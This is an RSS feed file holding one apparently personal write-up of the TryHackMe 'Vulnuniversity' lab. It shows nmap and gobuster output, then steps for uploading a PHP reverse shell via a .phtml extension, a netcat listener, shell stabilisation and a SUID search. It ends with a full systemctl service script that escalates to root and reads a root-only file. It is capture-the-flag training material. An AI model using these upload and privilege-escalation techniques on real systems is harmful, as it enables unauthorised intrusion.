@@ -1,0 +1,131 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>TryHackMe on Terminal</title>
+    <link>/tags/tryhackme/</link>
+    <description>Recent content in TryHackMe on Terminal</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Wed, 29 Sep 2021 12:04:29 +0530</lastBuildDate><atom:link href="/tags/tryhackme/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Vulnuniversity</title>
+      <link>/posts/thm/vulnuniversity/</link>
+      <pubDate>Wed, 29 Sep 2021 12:04:29 +0530</pubDate>
+      
+      <guid>/posts/thm/vulnuniversity/</guid>
+      <description>Nmap Results nmap -sC -sV -v -oN initial.log 10.10.170.203 PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA) | 256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA) |_ 256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP) 3128/tcp open http-proxy Squid http proxy 3.5.12 |_http-server-header: squid/3.5.12 |_http-title: ERROR: The requested URL could not be retrieved 3333/tcp open http Apache httpd 2.</description>
+      <content>&lt;h3 id=&#34;nmap-results&#34;&gt;Nmap Results&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;nmap -sC -sV -v -oN initial.log 10.10.170.203
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 3.0.3
+22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu Linux; protocol 2.0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+| ssh-hostkey: 
+|   &lt;span style=&#34;color:#ae81ff&#34;&gt;2048&lt;/span&gt; 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;RSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+|   &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ECDSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+|_  &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ED25519&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;workgroup: WORKGROUP&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;workgroup: WORKGROUP&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+3128/tcp open  http-proxy  Squid http proxy 3.5.12
+|_http-server-header: squid/3.5.12
+|_http-title: ERROR: The requested URL could not be retrieved
+3333/tcp open  http        Apache httpd 2.4.18 &lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Vuln University
+|_http-server-header: Apache/2.4.18 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;dangerous, but default&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+|_clock-skew: mean: 1h20m01s, deviation: 2h18m34s, median: 0s
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+| smb-os-discovery: 
+|   OS: Windows 6.1 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Samba 4.3.11-Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+|   Computer name: vulnuniversity
+|   NetBIOS computer name: VULNUNIVERSITY&lt;span style=&#34;color:#ae81ff&#34;&gt;\x&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;00&lt;/span&gt;
+|   Domain name: &lt;span style=&#34;color:#ae81ff&#34;&gt;\x&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;00&lt;/span&gt;
+|   FQDN: vulnuniversity
+|_  System time: 2021-09-17T12:50:03-04:00
+| nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;unknown&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+| Names:
+|   VULNUNIVERSITY&amp;lt;00&amp;gt;   Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;
+|   VULNUNIVERSITY&amp;lt;03&amp;gt;   Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;
+|   VULNUNIVERSITY&amp;lt;20&amp;gt;   Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;
+|   &lt;span style=&#34;color:#ae81ff&#34;&gt;\x&lt;/span&gt;01&lt;span style=&#34;color:#ae81ff&#34;&gt;\x&lt;/span&gt;02__MSBROWSE__&lt;span style=&#34;color:#ae81ff&#34;&gt;\x&lt;/span&gt;02&amp;lt;01&amp;gt;  Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;
+|   WORKGROUP&amp;lt;00&amp;gt;        Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;
+|   WORKGROUP&amp;lt;1d&amp;gt;        Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;
+|_  WORKGROUP&amp;lt;1e&amp;gt;        Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;
+| smb2-time: 
+|   date: 2021-09-17T16:50:03
+|_  start_date: N/A
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;gobuster&#34;&gt;GoBuster&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;gobuster dir -u http://10.10.170.203:3333 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;===============================================================&lt;/span&gt;
+Gobuster v3.1.0
+by OJ Reeves &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;@TheColonial&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &amp;amp; Christian Mehlmauer &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;@firefart&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;===============================================================&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Url:                     http://10.10.170.203:3333
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Method:                  GET
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Threads:                 &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Negative Status codes:   &lt;span style=&#34;color:#ae81ff&#34;&gt;404&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; User Agent:              gobuster/3.1.0
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Timeout:                 10s
+&lt;span style=&#34;color:#f92672&#34;&gt;===============================================================&lt;/span&gt;
+2021/09/17 22:29:36 Starting gobuster in directory enumeration mode
+&lt;span style=&#34;color:#f92672&#34;&gt;===============================================================&lt;/span&gt;
+/images               &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 301&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 322&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;--&amp;gt; http://10.10.170.203:3333/images/&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+/css                  &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 301&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 319&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;--&amp;gt; http://10.10.170.203:3333/css/&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;   
+/js                   &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 301&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 318&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;--&amp;gt; http://10.10.170.203:3333/js/&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;    
+/fonts                &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 301&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 321&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;--&amp;gt; http://10.10.170.203:3333/fonts/&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; 
+/internal             &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 301&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 324&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;--&amp;gt; http://10.10.170.203:3333/internal/&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;enumeration-and-gaining-access&#34;&gt;Enumeration and Gaining Access&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;There is a file upload on &lt;code&gt;/internal&lt;/code&gt; page&lt;/li&gt;
+&lt;li&gt;We can use this to upload a php reverse shell using the &lt;code&gt;.phtml&lt;/code&gt; file extension&lt;/li&gt;
+&lt;li&gt;Get the php rev shell code from pentestmonkey and change the ip to point to tun0 of LHOST&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;nc -lvnp 1234&lt;/code&gt; to listen for shell connection when navigated to /internal/uploads/rev-shell.phtml (file that was uploaded)&lt;/li&gt;
+&lt;li&gt;Get the reverse shell as www-data user.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;ls /home&lt;/code&gt; to view the users -&amp;gt; found bill&lt;/li&gt;
+&lt;li&gt;use &lt;code&gt;python3 -c &#39;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&#39;&lt;/code&gt; to get a ptty shell&lt;/li&gt;
+&lt;li&gt;use &lt;code&gt;export TERM=xterm&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;get the flag from user.txt file in bill home folder -&amp;gt; flag redacted&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;privesc&#34;&gt;PrivEsc&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;Try to check what can run using sudo with &lt;code&gt;sudo -l&lt;/code&gt;. -&amp;gt; cant use in a php reverse shell.&lt;/li&gt;
+&lt;li&gt;Try &lt;code&gt;find / -user root -perm -4000 -exec ls -ldb {} \;&lt;/code&gt; to find files with suid set -&amp;gt; found /bin/systemctl&lt;/li&gt;
+&lt;li&gt;Use GTFOBINS to check for systemctl for privesc&lt;/li&gt;
+&lt;li&gt;We can use the environment variable method to create a system service and assign that to the env variable.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;TF&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;mktemp&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;.service
+echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;[Service]
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Type=oneshot
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;ExecStart=/bin/bash -c &amp;#34;cat /root/root.txt &amp;gt; /tmp/flag&amp;#34;
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[Install]
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;WantedBy=multi-user.target&amp;#39;&lt;/span&gt; &amp;gt; $TF
+/bin/systemctl link $TF
+/bin/systemctl enable --now $TF
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;completed&#34;&gt;Completed&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;www-data@vulnuniversity:/$ ls /tmp   
+ls /tmp
+flag
+systemd-private-a88ef9fcca1740df8046c92c2fd10f42-systemd-timesyncd.service-crot11
+tmp.vmw8f6efHR
+tmp.vmw8f6efHR.service
+vriw3SD
+www-data@vulnuniversity:/$ cat /tmp/flag       
+cat /tmp/flag
+flag redacted
+www-data@vulnuniversity:/$ 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content>
+    </item>
+    
+  </channel>
+</rss>
